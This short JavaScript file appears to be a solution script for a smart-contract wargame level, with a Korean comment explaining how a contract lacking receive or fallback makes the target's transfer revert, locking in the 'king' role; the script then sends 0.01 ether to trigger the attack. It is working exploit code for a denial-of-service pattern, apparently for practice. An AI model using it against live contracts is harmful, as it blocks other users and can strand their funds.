const { signer, getContract } = require('../web3wrapper');

/*
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
  위 코드에서 transfer 에 주목하라.
  KingHack 컨트랙트는 입금시 receive 나 fallback 함수가 없다면 입금을 받지 않고 revert 시킨다.
  따라서 KingHack 컨트랙트는 king 이 되고 다음 타자는 뭔짓을 해도 transfer 를 성공시키지 못한다.
*/
async function execute(hackAddress, targetAddress) {
    const contract = getContract('KingHack', hackAddress);

    await contract.methods.attack(targetAddress).send({
        from: signer.address,
        value: '10000000000000000',
    });
}

module.exports = execute;